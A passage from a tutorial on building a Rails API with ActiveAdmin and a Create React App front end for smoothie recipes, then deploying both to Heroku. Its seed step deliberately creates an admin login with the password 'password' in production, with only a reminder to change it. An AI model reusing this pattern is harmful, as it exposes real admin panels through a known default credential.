:production.\nBundler.require(*Rails.groups)\n\nmodule ListOfIngredients\n  class Application < Rails::Application\n    # Initialize configuration defaults for originally generated Rails version.\n    config.load_defaults 5.2\n\n    # Settings in config/environments/* take precedence over those specified here.\n    # Application configuration can go into files in config/initializers\n    # -- all .rb files in that directory are automatically loaded after loading\n    # the framework and any gems in your application.\n\n    # Only loads a smaller set of middleware suitable for API only apps.\n    # Middleware like session, flash, cookies can be added back manually.\n    # Skip views, helpers and assets when generating a new resource.\n    config.api_only = true\n\n    # Middleware for ActiveAdmin\n    config.middleware.use Rack::MethodOverride\n    config.middleware.use ActionDispatch::Flash\n    config.middleware.use ActionDispatch::Cookies\n    config.middleware.use ActionDispatch::Session::CookieStore\n  end\nend Next up, your Gemfile . You’ll need to add the ActiveAdmin gems in: # ActiveAdmin\ngem 'devise'\ngem 'activeadmin' You should also move gem 'sqlite3' into the :development, :test group and add gem 'pg' into a new :production group. This is because Heroku doesn’t support sqlite's local disk storage (see factor six in The Twelve-Factor App), so you’ll need to ensure you're using Postgres for production. group :development, :test do\n  # Use sqlite3 as the database for Active Record\n  gem 'sqlite3'\n  # Call 'byebug' anywhere in the code to stop execution and get a debugger console\n  gem 'byebug', platforms: [:mri, :mingw, :x64_mingw]\nend group :production do\n  # Use postgres as the database for production\n  gem 'pg'\nend Your Gemfile should now look something like this: source 'https://rubygems.org'\ngit_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\n\nruby '2.5.1'\n\n# Bundle edge Rails instead: gem 'rails', github: 'rails/rails'\ngem 'rails', '~> 5.2.0'\n# Use Puma as the app server\ngem 'puma', '~> 3.11'\n# Build JSON APIs with ease. Read more: https://github.com/rails/jbuilder\n# gem 'jbuilder', '~> 2.5'\n# Use Redis adapter to run Action Cable in production\n# gem 'redis', '~> 4.0'\n# Use ActiveModel has_secure_password\n# gem 'bcrypt', '~> 3.1.7'\n\n# Use ActiveStorage variant\n# gem 'mini_magick', '~> 4.8'\n\n# Use Capistrano for deployment\n# gem 'capistrano-rails', group: :development\n\n# Reduces boot times through caching; required in config/boot.rb\ngem 'bootsnap', '>= 1.1.0', require: false\n\n# Use Rack CORS for handling Cross-Origin Resource Sharing (CORS), making cross-origin AJAX possible\n# gem 'rack-cors'\n\ngroup :development, :test do\n  # Use sqlite3 as the database for Active Record\n  gem 'sqlite3'\n  # Call 'byebug' anywhere in the code to stop execution and get a debugger console\n  gem 'byebug', platforms: [:mri, :mingw, :x64_mingw]\nend\n\ngroup :development do\n  gem 'listen', '>= 3.0.5', '< 3.2'\n  # Spring speeds up development by keeping your application running in the background. Read more: https://github.com/rails/spring\n  gem 'spring'\n  gem 'spring-watcher-listen', '~> 2.0.0'\nend\n\ngroup :production do\n  # Use postgres as the database for production\n  gem 'pg'\nend\n\n# ActiveAdmin\ngem 'devise'\ngem 'activeadmin'\n\n# Windows does not include zoneinfo files, so bundle the tzinfo-data gem\ngem 'tzinfo-data', platforms: [:mingw, :mswin, :x64_mingw, :jruby] Okay, okay. Someone out there will probably be sharpening their pitchfork right now because you should 100% run Postgres locally if you’re developing a Real Application to ensure your local environment matches your production one. But to make this tutorial a little less verbose, we’re going to bend the rules, together. Bundle install everything, and then install ActiveAdmin into your Rails app: bundle\nbin/rails g active_admin:install You should see something like the following: Running via Spring preloader in process 57692\n      invoke  devise\n    generate    devise:install\n      create    config/initializers/devise.rb\n      create    config/locales/devise.en.yml\n  ===============================================================================\n\nSome setup you must do manually if you haven't yet:\n\n  1. Ensure you have defined default url options in your environments files. Here\n     is an example of default_url_options appropriate for a development environment\n     in config/environments/development.rb:\n\n       config.action_mailer.default_url_options = { host: 'localhost', port: 3000 }\n\n     In production, :host should be set to the actual host of your application.\n\n  2. Ensure you have defined root_url to *something* in your config/routes.rb.\n     For example:\n\n       root to: \"home#index\"\n\n  3. Ensure you have flash messages in app/views/layouts/application.html.erb.\n     For example:\n\n       <p class=\"notice\"><%= notice %></p>\n       <p class=\"alert\"><%= alert %></p>\n\n  4. You can copy Devise views (for customization) to your app by running:\n\n       rails g devise:views\n\n===============================================================================\n      invoke    active_record\n      create      db/migrate/20180501170855_devise_create_admin_users.rb\n      create      app/models/admin_user.rb\n      invoke      test_unit\n      create        test/models/admin_user_test.rb\n      create        test/fixtures/admin_users.yml\n      insert      app/models/admin_user.rb\n       route    devise_for :admin_users\n        gsub    app/models/admin_user.rb\n        gsub    config/routes.rb\n      append    db/seeds.rb\n      create  config/initializers/active_admin.rb\n      create  app/admin\n      create  app/admin/dashboard.rb\n      create  app/admin/admin_users.rb\n      insert  config/routes.rb\n    generate  active_admin:assets\nRunning via Spring preloader in process 57711\n      create  app/assets/javascripts/active_admin.js\n      create  app/assets/stylesheets/active_admin.scss\n      create  db/migrate/20180501170858_create_active_admin_comments.rb If you're using a newer version of Rails and get an error, like the one below, you may be missing a manifest file : railtie.rb:105:in `block in <class:Railtie>': Expected to find a manifest file in `app/assets/config/manifest.js`\nBut did not, please create this file and use it to link any assets that need to be rendered by your app You'll need to run the following to create it: mkdir -p app/assets/config && echo '{}' > app/assets/config/manifest.js Once ActiveAdmin is installed, migrate and seed the database: bin/rake db:migrate db:seed Once again you can fire up Rails: bin/rails s -p 3001 This time hit http://localhost:3001/admin . You should see something like this: And you should take a moment to feel pretty great, because that was a lot . You can log into ActiveAdmin with the username admin@example.com and the password password . Security! You can change it really easily in the rad ActiveAdmin environment, though, so fear not. Step 3: Adding Create React App as the client Yay! Super-speedy Webpack asset handling! ( Shout out to Full Stack React for inspiring this bit. ) So. We need a front end. If you don’t have Create React App yet, install it globally with: npx create-react-app client npx comes with npm 5.2+ and higher. If you’re using an older version, you can run: npm install -g create-react-app\ncreate-react-app client It’ll take a bit. You probably have time for a cup of tea, if you’re feeling thirsty. Once it’s done, jump into client/src/index.js and remove these two lines: import registerServiceWorker from './registerServiceWorker';\nregisterServiceWorker(); This is because, in some cases, Create React App’s use of service workers clashes with Rails’ routing, and can leave you unable to access ActiveAdmin. Once you’re done, your client/src/index.js should look something like this: import React from 'react';\nimport ReactDOM from 'react-dom';\nimport './index.css';\nimport App from './App';\n\nReactDOM.render(<App />, document.getElementById('root')); You can now fire it up: yarn --cwd client start It’ll automatically visit http://localhost:3000/ , and you’ll have a simple Create React App running. That is good. Also, if you haven't seen yarn --cwd client before, that tells yarn to run the command in the client directory. It also saves us cd -ing into and out of directories. Winning! As I mentioned earlier, one of the best bits about working with Create React App and an API is that you can automatically proxy the API calls via the right port, without needing to swap anything between development and\nproduction. To do this, jump into your client/package.json and add a proxy property, like so: \"proxy\": \"http://localhost:3001\" Your client/package.json file will look like this: {\n  \"name\": \"client\",\n  \"version\": \"0.1.0\",\n  \"private\": true,\n  \"proxy\": \"http://localhost:3001\",\n  \"dependencies\": {\n    \"react\": \"^16.3.2\",\n    \"react-dom\": \"^16.3.2\",\n    \"react-scripts\": \"1.1.4\"\n  },\n  \"scripts\": {\n    \"start\": \"react-scripts start\",\n    \"build\": \"react-scripts build\",\n    \"test\": \"react-scripts test --env=jsdom\",\n    \"eject\": \"react-scripts eject\"\n  }\n} (You might wonder why we’re proxying port 3001 . Once we hook everything up our scripts will be running the API on port 3001 , which is why we’ve been running Rails that way. Nice one picking up on that, though, eagle-eyes. Asking the right questions!) fetch (along with a bunch of fancy new language features and polyfills you should 100% check out ) is included with Create React App, so our front end is ready to make calls to the API. But right now that would be pretty pointless—we’ll need some data to actually fetch. So let’s get this smoothie party started. We’ll need two relations, the Drinks , and the Ingredients that those drinks are made with. You’ll also need a blender, but honestly, if you don’t have one handy an apple juice with a couple of ice cubes is still so delicious. Promise. Now normally I’d say avoid scaffolding in Rails, because you end up with a ton of boilerplate code that you have to delete. For the purposes of the exercise, we’re going to use it, and then end up with a ton of boilerplate code that we have to delete. Do what I say, not what I do. Before that though, I should mention something. One downside to ActiveAdmin using inherited_resources , which reduces the boilerplate for Rails controllers, is that Rails then uses it when you scaffold anything in your app. That breaks stuff: $ bin/rails g scaffold Drink title:string description:string steps:string source:string\nRunning via Spring preloader in process 38277\nExpected string default value for '--serializer'; got true (boolean)\n      invoke  active_record\n      create    db/migrate/20170302183027_create_drinks.rb\n      create    app/models/drink.rb\n      invoke    test_unit\n      create      test/models/drink_test.rb\n      create      test/fixtures/drinks.yml\n      invoke  resource_route\n       route    resources :drinks\n      invoke  serializer\n      create    app/serializers/drink_serializer.rb\n      invoke  inherited_resources_controller\nCould not find \"api_controller.rb\" in any of your source paths. Your current source paths are:\n/usr/local/var/rbenv/versions/2.4.0/lib/ruby/gems/2.4.0/bundler/gems/inherited_resources-615b0d5c37a4/lib/generators/rails/templates \"Could not find\" is never a good start to the last line of output. Fortunately, this is a solvable problem. You just need to tell Rails to use the regular scaffolding process. You know, from the good old days. Just remind Rails which scaffold_controller to use in your config/application.rb and we can be on our way: config.app_generators.scaffold_controller = :scaffold_controller Your config/application.rb should look something like this, and everything should be right with the world again: require_relative 'boot'\n\nrequire \"rails\"\n# Pick the frameworks you want:\nrequire \"active_model/railtie\"\nrequire \"active_job/railtie\"\nrequire \"active_record/railtie\"\nrequire \"active_storage/engine\"\nrequire \"action_controller/railtie\"\nrequire \"action_mailer/railtie\"\nrequire \"action_view/railtie\"\nrequire \"action_cable/engine\"\nrequire \"sprockets/railtie\"\nrequire \"rails/test_unit/railtie\"\n\n# Require the gems listed in Gemfile, including any gems\n# you've limited to :test, :development, or :production.\nBundler.require(*Rails.groups)\n\nmodule ListOfIngredients\n  class Application < Rails::Application\n    # Initialize configuration defaults for originally generated Rails version.\n    config.load_defaults 5.2\n\n    # Settings in config/environments/* take precedence over those specified here.\n    # Application configuration can go into files in config/initializers\n    # -- all .rb files in that directory are automatically loaded after loading\n    # the framework and any gems in your application.\n\n    # Only loads a smaller set of middleware suitable for API only apps.\n    # Middleware like session, flash, cookies can be added back manually.\n    # Skip views, helpers and assets when generating a new resource.\n    config.api_only = true\n    config.app_generators.scaffold_controller = :scaffold_controller\n\n    # Middleware for ActiveAdmin\n    config.middleware.use Rack::MethodOverride\n    config.middleware.use ActionDispatch::Flash\n    config.middleware.use ActionDispatch::Cookies\n    config.middleware.use ActionDispatch::Session::CookieStore\n  end\nend This seems like a good moment for a shout out to the hours I spent trying to understand this particular error by typing every variation of it into StackOverflow. Back to scaffolding—let's start with the Drink model: bin/rails g scaffold Drink title:string description:string steps:string source:string Then, the Ingredient model: bin/rails g scaffold Ingredient drink:references description:string Notice that the Ingredient references the Drink . This tells the Ingredient model to belong_to the Drink , which is part of the whole has_many relative database association thing. See, my Relational Databases 101 comp-sci class was totally worth it. Unfortunately this won’t tell your Drink model to has_many of the Ingredient model, so you’ll also need to add that to app/models/drink.rb all by yourself: class Drink < ApplicationRecord\n  has_many :ingredients\nend Then we can migrate and tell ActiveAdmin about our new friends: bin/rake db:migrate\nbin/rails generate active_admin:resource Drink\nbin/rails generate active_admin:resource Ingredient Go team! Now, Rails is a security conscious beast, so you’ll need to add some stuff to the two files ActiveAdmin will have generated, app/admin/drinks.rb and app/admin/ingredients.rb . Specifically, you’ll need to permit ActiveAdmin to edit the content in your database, which, when you think about it, is pretty reasonable. First up, app/admin/drinks.rb : ActiveAdmin.register Drink do\n  permit_params :title, :description, :steps, :source\n\n# See permitted parameters documentation:\n# https://github.com/activeadmin/activeadmin/blob/master/docs/2-resource-customization.md#setting-up-strong-parameters\n#\n# permit_params :list, :of, :attributes, :on, :model\n#\n# or\n#\n# permit_params do\n#   permitted = [:permitted, :attributes]\n#   permitted << :other if params[:action] == 'create' && current_user.admin?\n#   permitted\n# end\n\nend Then app/admin/ingredients.rb : ActiveAdmin.register Ingredient do\n  permit_params :description, :drink_id\n\n# See permitted parameters documentation:\n# https://github.com/activeadmin/activeadmin/blob/master/docs/2-resource-customization.md#setting-up-strong-parameters\n#\n# permit_params :list, :of, :attributes, :on, :model\n#\n# or\n#\n# permit_params do\n#   permitted = [:permitted, :attributes]\n#   permitted << :other if params[:action] == 'create' && current_user.admin?\n#   permitted\n# end\n\nend Without permit_params , you can never edit your delicious drink recipes. Not on my watch. In our routes, we’ll need to hook up the drinks resource. I like to scope my API calls to /api , so let’s do that. scope '/api' do\n  resources :drinks\nend You can also remove these two declarations: resources :ingredients\nresources :drinks Your file should look something like this: Rails.application.routes.draw do\n  devise_for :admin_users, ActiveAdmin::Devise.config\n  ActiveAdmin.routes(self)\n\n  scope '/api' do\n    resources :drinks\n  end\nend Next up, start the server: bin/rails s -p 3001 And you should be able to visit http://localhost:3001/api/drinks to see… drumroll... [ ] Nothing. So, we should probably add some drinks. We can do that by populating db/seeds.rb , which is a file that allows you to add data to your database. You may notice a line is already here: AdminUser.create!(email: 'admin@example.com', password: 'password', password_confirmation: 'password') if Rails.env.development? To ensure we can log onto our CMS in production, let’s remove the if Rails.env.development? conditional that ActiveAdmin has added: AdminUser.create!(email: 'admin@example.com', password: 'password', password_confirmation: 'password') Just a friendly reminder to be a good internet citizen and update your password in production as soon as you seed it. To save time, and so you don’t have to source your own recipes, I prepared two tasty smoothies and one terrible pun. Add the recipes below: breakfast_smoothie = Drink.create(\n  title: \"Two-Minute Breakfast Boost\",\n  description: \"Whizz up a low-fat breakfast smoothie in no time. Use banana with other soft fruit, plus honey for a little sweetness and oats for slow-release fuel.\",\n  steps: \"Put all the ingredients in a blender and whizz for 1 min until smooth. Pour the mixture into two glasses to serve.\",\n  source: \"https://www.bbcgoodfood.com/recipes/two-minute-breakfast-smoothie\"\n)\nbreakfast_smoothie.ingredients.create(description: \"1 banana\")\nbreakfast_smoothie.ingredients.create(description: \"1 tbsp porridge oats\")\nbreakfast_smoothie.ingredients.create(description: \"80g soft fruit (like mango or strawberries)\")\nbreakfast_smoothie.ingredients.create(description: \"150ml milk\")\nbreakfast_smoothie.ingredients.create(description: \"1 tsp honey\")\nbreakfast_smoothie.ingredients.create(description: \"1 tsp vanilla extract\")\n\nkale_smoothie = Drink.create(\n  title: \"Kale And Hearty Smoothie\",\n  description: \"Give yourself a dose of vitamin C in the morning with this vegan green smoothie. Along with kale and avocado, there's a hit of zesty lime and pineapple.\",\n  steps: \"Put all of the ingredients into a bullet or smoothie maker, add a large splash of water and blitz. Add more water until you have the desired consistency.\",\n  source: \"https://www.bbcgoodfood.com/recipes/kale-smoothie\",\n)\nkale_smoothie.ingredients.create(description: \"2 handfuls kale\")\nkale_smoothie.ingredients.create(description: \"½ avocado\")\nkale_smoothie.ingredients.create(description: \"½ lime, juice only\")\nkale_smoothie.ingredients.create(description: \"large handful frozen pineapple chunks\")\nkale_smoothie.ingredients.create(description: \"medium-sized chunk ginger\")\nkale_smoothie.ingredients.create(description: \"1 tbsp cashew nuts\")\nkale_smoothie.ingredients.create(description: \"1 banana, optional\") Your db/seeds.rb file should now look something like this: # This file should contain all the record creation needed to seed the database with its default values.\n# The data can then be loaded with the rails db:seed command (or created alongside the database with db:setup).\n#\n# Examples:\n#\n#   movies = Movie.create([{ name: 'Star Wars' }, { name: 'Lord of the Rings' }])\n#   Character.create(name: 'Luke', movie: movies.first)\nAdminUser.create!(email: 'admin@example.com', password: 'password', password_confirmation: 'password')\n\nbreakfast_smoothie = Drink.create(\n  title: \"Two-Minute Breakfast Boost\",\n  description: \"Whizz up a low-fat breakfast smoothie in no time. Use banana with other soft fruit, plus honey for a little sweetness and oats for slow-release fuel.\",\n  steps: \"Put all the ingredients in a blender and whizz for 1 min until smooth. Pour the mixture into two glasses to serve.\",\n  source: \"https://www.bbcgoodfood.com/recipes/two-minute-breakfast-smoothie\"\n)\nbreakfast_smoothie.ingredients.create(description: \"1 banana\")\nbreakfast_smoothie.ingredients.create(description: \"1 tbsp porridge oats\")\nbreakfast_smoothie.ingredients.create(description: \"80g soft fruit (like mango or strawberries\")\nbreakfast_smoothie.ingredients.create(description: \"150ml milk\")\nbreakfast_smoothie.ingredients.create(description: \"1 tsp honey\")\nbreakfast_smoothie.ingredients.create(description: \"1 tsp vanilla extract\")\n\nkale_smoothie = Drink.create(\n  title: \"Kale And Hearty Smoothie\",\n  description: \"Give yourself a dose of vitamin C in the morning with this vegan green smoothie. Along with kale and avocado, there's a hit of zesty lime and pineapple.\",\n  steps: \"Put all of the ingredients into a bullet or smoothie maker, add a large splash of water and blitz. Add more water until you have the desired consistency.\",\n  source: \"https://www.bbcgoodfood.com/recipes/kale-smoothie\",\n)\nkale_smoothie.ingredients.create(description: \"2 handfuls kale\")\nkale_smoothie.ingredients.create(description: \"½ avocado\")\nkale_smoothie.ingredients.create(description: \"½ lime, juice only\")\nkale_smoothie.ingredients.create(description: \"large handful frozen pineapple chunks\")\nkale_smoothie.ingredients.create(description: \"medium-sized chunk ginger\")\nkale_smoothie.ingredients.create(description: \"1 tbsp cashew nuts\")\nkale_smoothie.ingredients.create(description: \"1 banana, optional\") Now it’s just a case of seeding the database with bin/rake db:reset . bin/rake db:reset It’s worth noting that this will recreate your database locally—including resetting your admin password back to password . If your server is running you’ll need to restart it, too: Now when you refresh you should see: Text smoothies! So, we’re pretty good to go on the database front. Let’s just massage our scaffolded controllers a little. First, let’s cut back the DrinksController . We can make sure def index only returns the id and title of each drink, and we can make sure def show includes the id and description of each ingredient of the drink. Given how little data is being sent back, you could just grab everything from index , but for the purposes of showing how this could work in the Real World, let’s do it this way. You’ll want to make sure your controllers are inheriting from ApiController , too. Jump into your drinks_controller.rb and replace it with the following: class DrinksController < ApiController\n  # GET /drinks\n  def index\n    @drinks = Drink.select(\"id, title\").all\n    render json: @drinks.to_json\n  end\n\n  # GET /drinks/:id\n  def show\n    @drink = Drink.find(params[:id])\n    render json: @drink.to_json(:include => { :ingredients => { :only => [:id, :description] }})\n  end\nend And let’s just get rid of 99% of ingredients_controller.rb , because it’s not going to be doing a lot: class IngredientsController < ApiController\nend So minimal! And now we have some fancy data to feed the client. Good for us! This is a big chunk of the setup, and you’re doing great. Maybe celebrate by taking a break? You have earned it. When you’re back, let’s create a Procfile in the root of the app for running the whole setup. If you haven’t used them before, you can read about them here . We’ll call it Procfile.dev , because while we do need to run a Node server locally, we’ll be deploying a pre-built bundle to Heroku, and we won’t need to run a Node server there. Having a Node server and Rails server locally massively speeds up development time, and it is pretty great, but it’s overkill for production. Your Procfile.dev should look like this: web: PORT=3000 yarn --cwd client start\napi: PORT=3001 bundle exec rails s Procfiles are managed by the heroku CLI, which, if you don’t have installed, you can get right here . Once that’s sorted, just run: heroku local -f Procfile.dev But hey, who wants to type that every single time? Why not make a rake task to manage doing it for you? Just add start.rake to your /lib/tasks folder: namespace :start do\n  task :development do\n    exec 'heroku local -f Procfile.dev'\n  end\nend\n\ndesc 'Start development server'\ntask :start => 'start:development' And from there all you need to do to fire up your development environment is run: bin/rake start One command to fire up two servers? Magic! That step was a lot. Let’s break down what’s happening here. heroku will start the front end, /client , on port 3000 , and the API on port 3001. It’ll then open the client, http://localhost:3000 in your browser. You can access ActiveAdmin via the API, at http://localhost:3001/admin , just like you’ve been doing all along. Which means we can now sort out the React app. The simplest thing is to just check it works. Edit your client/src/App.js : import React, { Component } from 'react';\nimport logo from './logo.svg';\nimport './App.css';\n\nclass App extends Component {\n  componentDidMount() {\n    window.fetch('/api/drinks')\n      .then(response => response.json())\n      .then(json => console.log(json))\n      .catch(error => console.log(error));\n  }\n  render() {\n    return (\n      <div className=\"App\">\n        <div className=\"App-header\">\n          <img src={logo} className=\"App-logo\" alt=\"logo\" />\n          <h2>Welcome to React</h2>\n        </div>\n        <p className=\"App-intro\">\n          To get started, edit <code>src/App.js</code> and save to reload.\n        </p>\n      </div>\n    );\n  }\n}\n\nexport default App; In your browser console, you should see the API call logged. [{id: 1, title: \"Two-Minute Breakfast Boost\"}, {id: 2, title: \"Kale And Hearty Smoothie\"}] We can 100% use those id’s to grab the actual details of each smoothie in Rails. Sure, we could’ve just sent everything from the server because it’s only two drinks, but I figure this is closer to how you’d really build something. Now, if you'd rather skip setting up the front end application, you can grab the client folder from the repo . Otherwise, install the following dependencies: yarn --cwd client add semantic-ui-react semantic-ui-css And add them to your /client app. First, add the css to client/src/index.js : import React from 'react'\nimport ReactDOM from 'react-dom'\nimport App from './App'\nimport 'semantic-ui-css/semantic.css'\nimport './index.css'\n\nReactDOM.render(<App />, document.getElementById('root')) And add all the fancy bells and whistles to your client/src/App.js : import React, { Component } from 'react'\nimport { Container, Header, Segment, Button, Icon, Dimmer, Loader, Divider } from 'semantic-ui-react'\n\nclass App extends Component {\n  constructor () {\n    super()\n    this.state = {}\n    this.getDrinks = this.getDrinks.bind(this)\n    this.getDrink = this.getDrink.bind(this)\n  }\n\n  componentDidMount () {\n    this.getDrinks()\n  }\n\n  fetch (endpoint) {\n    return window.fetch(endpoint)\n      .then(response => response.json())\n      .catch(error => console.log(error))\n  }\n\n  getDrinks () {\n    this.fetch('/api/drinks')\n      .then(drinks => {\n        if (drinks.length) {\n          this.setState({drinks: drinks})\n          this.getDrink(drinks[0].id)\n        } else {\n          this.setState({drinks: []})\n        }\n      })\n  }\n\n  getDrink (id) {\n    this.fetch(`/api/drinks/${id}`)\n      .then(drink => this.setState({drink: drink}))\n  }\n\n  render () {\n    let {drinks, drink} = this.state\n    return drinks\n      ? <Container text>\n        <Header as='h2' icon textAlign='center' color='teal'>\n          <Icon name='unordered list' circular />\n          <Header.Content>\n            List of Ingredients\n          </Header.Content>\n        </Header>\n        <Divider hidden section />\n        {drinks && drinks.length\n          ? <Button.Group color='teal' fluid widths={drinks.length}>\n            {Object.keys(drinks).map((key) => {\n              return <Button active={drink && drink.id === drinks[key].id} fluid key={key} onClick={() => this.getDrink(drinks[key].id)}>\n                {drinks[key].title}\n              </Button>\n            })}\n          </Button.Group>\n          : <Container textAlign='center'>No drinks found.</Container>\n        }\n        <Divider section />\n        {drink &&\n          <Container>\n            <Header as='h2'>{drink.title}</Header>\n            {drink.description && <p>{drink.description}</p>}\n            {drink.ingredients &&\n              <Segment.Group>\n                {drink.ingredients.map((ingredient, i) => <Segment key={i}>{ingredient.description}</Segment>)}\n              </Segment.Group>\n            }\n            {drink.steps && <p>{drink.steps}</p>}\n            {drink.source && <Button basic size='tiny' color='teal' href={drink.source}>Source</Button>}\n          </Container>\n        }\n      </Container>\n      : <Container text>\n        <Dimmer active inverted>\n          <Loader content='Loading' />\n        </Dimmer>\n      </Container>\n  }\n}\n\nexport default App I should clarify that this is what I like to call “proof of concept code”, rather than “well refactored code”. But, given we're already having a look at it, the main bit worth reviewing is getDrink : getDrink (id) {\n  this.fetch(`/api/drinks/${id}`)\n    .then(drink => this.setState({drink: drink}))\n} This allows us to grab a specific drink based on its id. You can test it in the browser by visiting http://localhost:3001/api/drinks/1: While we’re here, you can also add some simple styles to your client/src/index.css : body {\n  margin: 0;\n  padding: 0;\n  font-family: sans-serif;\n}\n\n#root {\n  padding: 4rem 0;\n} You now should have a fancy front end that uses Semantic UI and looks something like this: Kale and Hearty! Get it? Step 4: Get everything ready for production With Rails serving the Webpack bundle So, how do we get our Rails app serving the Webpack bundle in production? That’s where the magic of Heroku's heroku-postbuild comes in. Heroku will build the app, then copy the files into the /public directory to be served by Rails. We end up running a single Rails server managing our front end and our back end. It’s win-win! There are a couple of steps to make that happen. First up, let’s make a package.json file in the root of the app, which tells Heroku how to compile the Create React App. The heroku-postbuild command will get run after Heroku has built your application, or slug . You may also notice that the build command uses yarn --cwd client , which tells yarn to run those commands in the client directory. {\n  \"name\": \"list-of-ingredients\",\n  \"license\": \"MIT\",\n  \"engines\": {\n    \"node\": \"10.15.3\",\n    \"yarn\": \"1.15.2\"\n  },\n  \"scripts\": {\n    \"build\": \"yarn --cwd client install && yarn --cwd client build\",\n    \"deploy\": \"cp -a client/build/. public/\",\n    \"heroku-postbuild\": \"yarn build && yarn deploy\"\n  }\n} On the plus side, this step is super short, which is just as well because my hands are getting sore. Step 5: Deploy it to Heroku And celebrate, because you’ve earned it The finish line approaches! Soon, everything the light touches will be yours, including a fresh, healthy beverage. Let’s make a Procfile , in the root, for production. It will tell Heroku how to run the Rails app. Add the following: web: bundle exec rails s\nrelease: bin/rake db:migrate Note the release command—this is run by Heroku just before a new release of the app is deployed, and we’ll use it to make sure our database is migrated. You can read more about release phase here. We'll also need a secrets.yml file, which lives in config . This is required by Devise, which handles the authentication for ActiveAdmin. You'll need to make a config/secrets.yml file, and it should look like this: development:\n  secret_key_base: \n\ntest:\n  secret_key_base: \n\nproduction:\n  secret_key_base: <%= ENV[\"SECRET_KEY_BASE\"] %> We'll need to add two keys, one for development and one for test. Fortunately, Rails is here to help. Just run: bin/rake secret | pbcopy This will generate a secret key, and add it to your clipboard. Just paste it after secret_key_base below development . Repeat the same for test , and you should end up with a config/secrets.yml that looks something like this: development:\n  secret_key_base: A_LONG_STRING_OF_LETTERS_AND_NUMBERS\n\ntest:\n  secret_key_base: A_DIFFERENT_LONG_STRING_OF_LETTERS_AND_NUMBERS\n\nproduction:\n  secret_key_base: <%= ENV[\"SECRET_KEY_BASE\"] %> And then let’s create a new Heroku app to get this thing over the finish line: heroku apps:create If you commit and push to Heroku right now, this looks to Heroku like a dual Rails / Node app, which is great. The thing is, your Node code needs to be executed first so it can be served by Rails. This is where Heroku buildpacks come in — they transform your deployed code to run on Heroku. We can tell Heroku, via the terminal, to use two buildpacks (or build processes) in a specific order. First nodejs , to manage the front end build, and then ruby , to run Rails: heroku buildpacks:add heroku/nodejs --index 1\nheroku buildpacks:add heroku/ruby --index 2 With that sorted, we can deploy and build our beverage-based app: git add .\ngit commit -vam \"Initial commit\"\ngit push heroku master Heroku will follow the order of the buildpacks, building client , and then firing up Rails. One last thing—you’ll need to seed your database on Heroku, or ActiveAdmin will not be thrilled (and you won’t be able to log in). We won't need to worry about migrating, because that'll happen behind the scenes through the release script in our Procfile . Let’s seed so we can login and change the /admin password: heroku run rake db:seed And finally: heroku open And there you have it: Check it out at https://list-of-ingredients.herokuapp.com/ When you visit your app you’ll see your Create React App on the client side, displaying some delicious smoothie recipes. You’ll also be able hit /admin (for example, https://list-of-ingredients.herokuapp.com/admin ) and access your database using that truly terrible username and password ActiveAdmin chose for you. Again, I’d recommend changing those on production ASAP. I did, in case anyone was thinking of changing my demo recipes to be less delicious. Bonus round: Single page apps Handling routes with your single page app Now, you may at this point want to add different pages, handled within your Create React App, using something like React Router . This will require a few additions to the Rails app as well. Let’s get started! First up, we’re going to tell Rails to pass any HTML requests that it doesn’t catch to our Create React App. In your app/controllers/application_controller.rb , add a fallback_index_html method: def fallback_index_html\n  render :file => 'public/index.html'\nend It should look something like this: class ApplicationController < ActionController::Base\n  protect_from_forgery with: :exception\n\n  def fallback_index_html\n    render :file => 'public/index.html'\n  end\nend And at the bottom of your config/routes.rb : get '*path', to: \"application#fallback_index_html\", constraints: ->(request) do\n  !request.xhr? && request.format.html?\nend So it looks something like this: Rails.application.routes.draw do\n  devise_for :admin_users, ActiveAdmin::Devise.config\n  ActiveAdmin.routes(self)\n\n  scope '/api' do\n    resources :drinks\n  end\n\n  get '*path', to: \"application#fallback_index_html\", constraints: ->(request) do\n    !request.xhr? && request.format.html?\n  end\nend That way Rails will pass anything it doesn’t match over to your client/index.html so that React Router can take over. Winning! From here, we can implement React Router and catch some 404’s. First off, let’s install React Router: yarn --cwd client add react-router-dom We’ll need to move our client/src/App.js into its own component, so we can use the App class to handle routes and navigation. Rename App.js to Home.js , and update the class name to Home . Your client/src/Home.js should look like this: import React, { Component } from 'react'\nimport { Container, Header, Segment, Button, Icon, Dimmer, Loader, Divider } from 'semantic-ui-react'\n\nclass Home extends Component {\n  constructor () {\n    super()\n    this.state = {}\n    this.getDrinks = this.getDrinks.bind(this)\n    this.getDrink = this.getDrink.bind(this)\n  }\n\n  componentDidMount () {\n    this.getDrinks()\n  }\n\n  fetch (endpoint) {\n    return window.fetch(endpoint)\n      .then(response => response.json())\n      .catch(error => console.log(error))\n  }\n\n  getDrinks () {\n    this.fetch('/api/drinks')\n      .then(drinks => {\n        if (drinks.length) {\n          this.setState({drinks: drinks})\n          this.getDrink(drinks[0].id)\n        } else {\n          this.setState({drinks: []})\n        }\n      })\n  }\n\n  getDrink (id) {\n    this.fetch(`/api/drinks/${id}`)\n      .then(drink => this.setState({drink: drink}))\n  }\n\n  render () {\n    let {drinks, drink} = this.state\n    return drinks\n      ? <Container text>\n        <Header as='h2' icon textAlign='center' color='teal'>\n          <Icon name='unordered list' circular />\n          <Header.Content>\n            List of Ingredients\n          </Header.Content>\n        </Header>\n        <Divider hidden section />\n        {drinks && drinks.length\n          ? <Button.Group color='teal' fluid widths={drinks.length}>\n            {Object.keys(drinks).map((key) => {\n              return <Button active={drink && drink.id === drinks[key].id} fluid key={key} onClick={() => this.getDrink(drinks[key].id)}>\n                {drinks[key].title}\n              </Button>\n            })}\n          </Button.Group>\n          : <Container textAlign='center'>No drinks found.</Container>\n        }\n        <Divider section />\n        {drink &&\n          <Container>\n            <Header as='h2'>{drink.title}</Header>\n            {drink.description && <p>{drink.description}</p>}\n            {drink.ingredients &&\n              <Segment.Group>\n                {drink.ingredients.map((ingredient, i) => <Segment key={i}>{ingredient.description}</Segment>)}\n              </Segment.Group>\n            }\n            {drink.steps && <p>{drink.steps}</p>}\n            {drink.source && <Button basic size='tiny' color='teal' href={drink.source}>Source</Button>}\n          </Container>\n        }\n      </Container>\n      : <Container text>\n        <Dimmer active inverted>\n          <Loader content='Loading' />\n        </Dimmer>\n      </Container>\n  }\n}\n\nexport default Home And let’s make a component to display our 404, client/src/NotFound.js . import React, { Component } from 'react'\nimport { Container, Button } from 'semantic-ui-react'\nimport { Link } from 'react-router-dom'\n\nclass NotFound extends Component {\n  render () {\n    return <Container text textAlign='center'>\n      <h1>404: Not found</h1>\n      <Button as={Link} to='/'>Back to home</Button>\n    </Container>\n  }\n}\n\nexport default NotFound Make a new 